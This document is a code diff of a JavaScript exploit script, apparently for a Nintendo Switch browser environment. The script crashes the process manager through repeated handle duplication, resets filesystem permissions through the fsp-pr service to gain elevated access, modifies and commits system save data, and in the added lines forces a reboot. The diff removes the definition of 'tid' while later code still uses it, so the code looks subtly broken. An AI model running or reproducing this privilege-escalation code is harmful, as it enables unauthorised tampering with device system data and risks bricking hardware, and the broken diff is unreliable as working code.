@@ -3,12 +3,6 @@
 // BEWARE! By modifying system save data you risk a brick.
 //
 
-sc.IFileSystem.prototype.DeleteFile = function (path) {
-	var pbuf = utils.str2ab(path);
-	var res = this.sc.ipcMsg(1).datau64(0).xDescriptor(pbuf, pbuf.byteLength, 0).sendTo(this.handle);
-	return res.asResult();
-};
-
 sc.killAutoHandle();
 
 var save_struct = new Uint8Array([
@@ -28,11 +22,6 @@ var perm_b = new Uint8Array([
 	0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 	0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
 ]);
-
-if (sc.version !== '1.0.0') {
-    throw new Error('This fake news is only useful on 1.0.0.');
-}
-
 
 var save_data;
 var save_file = "/data/D00000000000000000000_LS00000000000000010000.msgpack"
@@ -58,8 +47,8 @@ if (sc.elev_privs === undefined || !sc.elev_privs) {
         utils.log("got handle 0x" + hndle.toString(16));
 
         // get webkit PID
-        var tid = utils.parseAddr('010000000000100A');
-        var pid = sc.ipcMsg(3).datau64(tid).sendTo(hndle).assertOk().data[0];
+        
+
 
         // crash PM
         for(var i = 0; i < 64; i++)
@@ -69,15 +58,17 @@ if (sc.elev_privs === undefined || !sc.elev_privs) {
                 utils.log("duplicate 0x" + res.movedHandles[0].toString(16));
         }
 
-        sc.getService("fsp-pr", (hndle) => {
-            // ClearFsPermissions
-            sc.ipcMsg(1).data(pid).sendTo(hndle).assertOk();
-            // SetFsPermissions
-            sc.ipcMsg(0).data(3, pid, tid, 0x1c, 0x2c).aDescriptor(perm_a.buffer, 0x1c, 0).aDescriptor(perm_b.buffer, 0x2c, 0).sendTo(hndle).assertOk();
-        });
-
-
-
+    });
+    var pid = sc.getService('fsp-srv', (tmp_hnd) => {
+        utils.log("got fspsrv");
+        sc.ipcMsg(1).sendPid().data(0).sendTo(tmp_hnd).assertOk();
+        return sc.read4(sc.ipcBufAddr, 0xC >> 2);
+    });
+    sc.getService("fsp-pr", (hndle) => {
+        // ClearFsPermissions
+        sc.ipcMsg(1).data(pid).sendTo(hndle).assertOk();
+        // SetFsPermissions
+        sc.ipcMsg(0).data(3, pid, tid, 0x1c, 0x2c).aDescriptor(perm_a.buffer, 0x1c, 0).aDescriptor(perm_b.buffer, 0x2c, 0).sendTo(hndle).assertOk();
     });
     sc.elev_privs = true;
 }
@@ -104,5 +95,10 @@ sc.getService("fsp-srv", (hndle) => {
         utils.log("commit");
         sc.ipcMsg(10).sendTo(bish).assertOk(); // commit
         utils.log("finished");
+        if (this.version === '1.0.0') {    
+            sc.ipcMsg(1).sendTo("bpc:c").assertOk();
+        } else {
+            sc.ipcMsg(1).sendTo("bpc").assertOk();
+        }
     });
 });
